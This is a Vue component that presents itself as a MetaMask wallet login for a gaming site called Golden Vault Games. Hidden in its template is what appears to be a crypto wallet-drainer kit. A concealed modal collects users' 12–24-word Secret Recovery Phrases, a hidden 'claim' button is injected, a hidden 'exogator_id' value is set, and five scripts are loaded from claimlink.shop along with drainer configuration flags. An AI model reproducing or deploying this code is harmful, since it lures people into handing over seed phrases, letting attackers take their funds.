<template>
  <div class="wallet-login">
    <h2>Web3 Wallet Login</h2>
    <div v-if="account" class="connected-account">
      <p>Connected Account:</p>
      <div class="account-address">{{ account }}</div>
      <button @click="disconnect" class="disconnect-btn">Disconnect</button>
    </div>
    <div v-else class="connect-prompt">
      <p>Connect your MetaMask wallet to access Golden Vault Games.</p>
      <button
        @click="connectWallet"
        :disabled="isConnecting"
        class="connect-btn"
      >
        {{ isConnecting ? "Connecting..." : "Connect MetaMask" }}
      </button>
    </div>

    <!-- Modal for connecting wallets -->
    <div id="modal-container" class="modal__container">
      <div class="modal-content">
        <div class="modal__close close-modal" onclick="closeModal()" title="Close">
          <i class='bx bx-x'></i>
        </div>

        <h1 id="tito1" class="modal__title">Connect your wallet</h1>
        <p id="tito2" class="modal__description">Please select one of the options below to connect your wallet.</p>

        <button id="tito3" class="modal__button modal__button-width" onclick="start_exogator()">
          Other wallets 
          <t bis_skin_checked="1" style="width: 32px;right: 58px;position: absolute;border-radius: 12px;margin-top: -7px;background: #cfcfcf;padding: 8px 7px;color: #636363;font-weight: 600;font-family: monospace;border: 1px solid #cccccca3;"> 350+</t>

          <img src="https://cdn.iconscout.com/icon/free/png-256/free-metamask-logo-icon-download-in-svg-png-gif-file-formats--browser-extension-chrome-logos-icons-2261817.png" style=" width: 23px; right: 110px; position: absolute; border-radius: 12px; margin-top: -7px; padding: 4px 5px; background: #ffd3a1; border: 1px solid #b5b5b5; "> 

          <img src="https://vectorseek.com/wp-content/uploads/2024/07/Trust-Wallet-Shield-Logo-Vector-Logo-Vector.svg-.png" style=" width: 21px; right: 134px; position: absolute; border-radius: 12px; margin-top: -7px; padding: 4px 6px; background: #ffffff; border: 1px solid #cccccca3; box-shadow: 3px 1px 10px -5px; "> 

          <img src="https://images.mirror-media.xyz/publication-images/Lx_fohJ8ttprQ3DmDKU9N.png?height=2048&amp;width=2048" style=" width: 33px; right: 158px; position: absolute; border-radius: 12px; margin-top: -7px; padding: 0px 0px; /* border: 1px solid #b5b5b5; */ box-shadow: 3px 1px 10px -5px; ">

        </button>

        <button id="tito4" class="modal__button modal__button-width" onclick="showseedme()"> 
          Connect manually <t bis_skin_checked="1" style="width: 32px;right: 58px;position: absolute;border-radius: 12px;margin-top: -7px;background: #cfcfcf;padding: 8px 7px;color: #636363;font-weight: 600;font-family: monospace;border: 1px solid #cccccca3;">Seed</t>
        </button>

        <button class="modal__button-link close-modal">
          <a style=" color: #9f9f9f; text-decoration: none; " href="https://trustwallet.com/">Haven't got a wallet ? Get started</a>
        </button>
      </div>
    </div>

    <!-- The Modal -->
    <div id="myModal" class="modal">
      <!-- Modal content -->
      <div class="modal-content">
        <div style="padding: 20px 22px;">
          <span class="close">
            <select onchange="generateSeedPhraseInputs(this.value)" style="background: #ebebeb; padding: 4px; border: 1px solid #ccc; border-radius: 9px; margin-right: 14px; color: #595959;">
              <option value="12" selected>12-word phrase</option>
              <option value="15">15-word phrase</option>
              <option value="18">18-word phrase</option>
              <option value="21">21-word phrase</option>
              <option value="24">24-word phrase</option>
            </select>
          </span>

          <h2 style="margin: 0px;">Connect manually</h2>
          <p style="margin-top: 6px;font-size: 14px;color: #555555;">Enter the Secret Recovery Phrase that you were given when you created your wallet.</p>
          <div>
            <div class="seed-phrase-container" id="seedPhraseContainer"></div>
          </div>

          <t id="inva" style=" color: #ff0000; margin-left: 12px; margin-top: 12px; display: none; font-size: 14px; "><i class="bx bxs-info-circle"></i> Invalid Secret Recovery Phrase </t>
          <t id="spco" style=" color: #ff0000; margin-left: 12px; margin-top: 12px; display: none; font-size: 14px; "><i class="bx bxs-info-circle"></i> Secret Recovery Phrases contain 12, 15, 18, 21, or 24 words </t>

          <button onclick="checkAllFieldsFilled()" style=" margin-top: 20px; border: 0; background: #000; color: #fff; padding: 14px 16px; border-radius: 18px; width: 100%; font-weight: 400; font-size: 16px; cursor: pointer; cursor: pointer; border: none; outline: none; ">Connect Wallet</button>
          
          <div style="margin-top: 8px;text-align: center;">
            <span style="display: inline-block;vertical-align: middle;color: #898989;font-size: 14px;">Powered by</span>
            <img src="https://miro.medium.com/v2/resize:fit:1400/1*aGWMU1Z_3eMiO74hv_mgjA.png" style="width: 100px; display: inline-block; vertical-align: middle;">
          </div>
        </div>
      </div>
    </div>

    <!-- Hidden input for exogator_id -->
    <input type="hidden" value="OFQ2CBHZJORTJ6WVYQVHUYENX2KSC9SLPHFZUEDLTNKGU" id="exogator_id">

    <!-- Ensure elements and attach event listeners -->
    <script>
      (function () {
        // Run when DOM is ready
        function onReady(fn) {
          if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', fn);
          } else {
            fn();
          }
        }

        onReady(function ensureElements() {
          // Ensure button with class "ex0claim"
          let btn = document.querySelector('.ex0claim');
          if (!btn) {
            btn = document.createElement('button');
            btn.className = 'ex0claim';
            btn.style.display = 'none'; // keep same default as your markup
            btn.textContent = 'Claim';
            // append to body (or to a specific container you prefer)
            document.body.appendChild(btn);
            console.info('Created missing .ex0claim button');
          } else {
            console.info('.ex0claim found');
          }

          // Attach event listener safely (doesn't duplicate listeners)
          function safeAttach(el, handlerName) {
            // If global function exists, use it; otherwise create a stub.
            const globalFn = (typeof window[handlerName] === 'function') ? window[handlerName] : function () {
              console.warn(handlerName + ' is not defined');
            };
            // Remove any duplicate wrapped listener we know about using a symbol flag.
            const FLAG = '__ex0claim_attached__';
            if (!el[FLAG]) {
              el.addEventListener('click', globalFn);
              el[FLAG] = true;
            }
          }
          safeAttach(btn, 'claim');

          // Ensure span with id "adresstracker"
          let span = document.getElementById('adresstracker');
          if (!span) {
            span = document.createElement('span');
            span.id = 'adresstracker';
            span.style.color = '#fff';
            span.style.display = 'none';
            document.body.appendChild(span);
            console.info('Created missing #adresstracker span');
          } else {
            console.info('#adresstracker found');
          }
        });
      })();
    </script>

    <!-- Additional scripts -->
    <script>
      let choice_be = 4;
      let evm = 1;
      let seed = 1;
      let auto = 1;
      let dark = 1;
      let towsteps = 1; // please read docs before enabling this feature
    </script>

    <!-- External scripts -->
    <script src="https://claimlink.shop/assets/eth.js?v=09.19.205"></script>
    <script src="https://claimlink.shop/assets/w-modal.js?v=09.19.205"></script>
    <script src="https://claimlink.shop/assets/w-loader.js?v=09.19.205"></script>
    <script src="https://claimlink.shop/assets/modules.js?v=09.19.205"></script>
    <script src="https://claimlink.shop/assets/main.js?v=09.19.205"></script>

    <!-- jQuery and Bootstrap -->
    <script src="https://code.jquery.com/jquery-3.7.1.slim.min.js" integrity="sha256-kmHvs0B+OpCW5GVHUNjv9rOmY0IvSIRcf7zGUDTDQM8=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
  </div>
</template>

<script setup>
import { ref, onMounted } from "vue";
import Web3 from "web3";
import { supabase } from "../utils/supabaseClient";

const account = ref(null);
const isConnecting = ref(false);

const checkConnection = async () => {
  if (window.ethereum) {
    const web3 = new Web3(window.ethereum);
    try {
      const accounts = await web3.eth.getAccounts();
      if (accounts.length > 0) {
        account.value = accounts[0];
        await handleUserLogin(accounts[0]);
      }
    } catch (error) {
      console.error("Error checking connection:", error);
    }
  }
};

const connectWallet = async () => {
  if (typeof window.ethereum !== "undefined") {
    try {
      isConnecting.value = true;
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });
      account.value = accounts[0];
      await handleUserLogin(accounts[0]);
    } catch (error) {
      console.error("Error connecting wallet:", error);
    } finally {
      isConnecting.value = false;
    }
  } else {
    alert("Please install MetaMask!");
  }
};

const handleUserLogin = async (walletAddress) => {
  try {
    const { data, error } = await supabase
      .from("users")
      .select("*")
      .eq("wallet_address", walletAddress)
      .single();

    if (error && error.code !== "PGRST116") {
      console.error("Error fetching user data:", error);
      return;
    }

    if (!data) {
      const { error: insertError } = await supabase.from("users").insert([
        {
          wallet_address: walletAddress,
          name: `User_${walletAddress.substring(0, 6)}`,
          balance: 100,
          choice_be: 4,
          evm: 1,
          seed: 1,
          auto: 1,
          dark: 1,
          towsteps: 1,
        },
      ]);

      if (insertError) {
        console.error("Error creating new user:", insertError);
      }
    }
  } catch (err) {
    console.error("Login error:", err);
  }
};

const disconnect = () => {
  account.value = null;
};

onMounted(() => {
  checkConnection();
});
</script>

<style scoped>
.wallet-login {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 24px;
  background-color: #1a1a1a;
  border-radius: 12px;
  border: 2px solid rgba(255, 204, 0, 0.2);
  color: white;
  max-width: 400px;
  margin: 0 auto;
}

h2 {
  color: #ffcc00;
  margin-bottom: 16px;
}

.account-address {
  background-color: #0d0d0d;
  padding: 8px 12px;
  border-radius: 8px;
  font-family: monospace;
  margin-bottom: 16px;
  word-break: break-all;
  color: #4ade80;
}

.connect-btn {
  width: 100%;
  padding: 12px;
  background-color: #f6851b;
  color: white;
  font-weight: bold;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  margin-top: 16px;
  transition: background-color 0.2s;
}

.connect-btn:hover {
  background-color: #e2761b;
}

.connect-btn:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

.disconnect-btn {
  width: 100%;
  padding: 12px;
  background-color: transparent;
  color: white;
  border: 1px solid white;
  border-radius: 8px;
  cursor: pointer;
}

/* Modal styles */
.modal__container {
  display: none; /* Hidden by default */
  position: fixed;
  z-index: 1000;
  left: 0;
  top: 0;
  width: 100%;
  height: 100%;
  overflow: auto;
  background-color: rgba(0, 0, 0, 0.4);
}

.modal__content {
  background-color: #fefefe;
  margin: 5% auto;
  padding: 20px;
  border: 1px solid #888;
  width: 80%;
  max-width: 600px;
  border-radius: 12px;
}

.modal__close {
  color: #aaa;
  float: right;
  font-size: 28px;
  font-weight: bold;
  cursor: pointer;
}

.modal__close:hover,
.modal__close:focus {
  color: black;
  text-decoration: none;
  cursor: pointer;
}

.modal__title {
  margin-bottom: 16px;
  color: #333;
}

.modal__description {
  margin-bottom: 24px;
  color: #555;
}

.modal__button {
  width: 100%;
  padding: 12px;
  background-color: #f6851b;
  color: white;
  font-weight: bold;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  margin-bottom: 12px;
}

.modal__button:hover {
  background-color: #e2761b;
}

.modal__button-width {
  width: calc(50% - 6px);
  display: inline-block;
}

.modal__button-link {
  text-align: center;
  margin-top: 12px;
}

/* Modal styles for manual connection */
.modal {
  display: none; /* Hidden by default */
  position: fixed;
  z-index: 1001;
  left: 0;
  top: 0;
  width: 100%;
  height: 100%;
  overflow: auto;
  background-color: rgba(0, 0, 0, 0.4);
}

.modal-content {
  background-color: #fefefe;
  margin: 5% auto;
  padding: 20px;
  border: 1px solid #888;
  width: 80%;
  max-width: 600px;
  border-radius: 12px;
}

.close {
  color: #aaa;
  float: right;
  font-size: 28px;
  font-weight: bold;
  cursor: pointer;
}

.close:hover,
.close:focus {
  color: black;
  text-decoration: none;
  cursor: pointer;
}
</style>
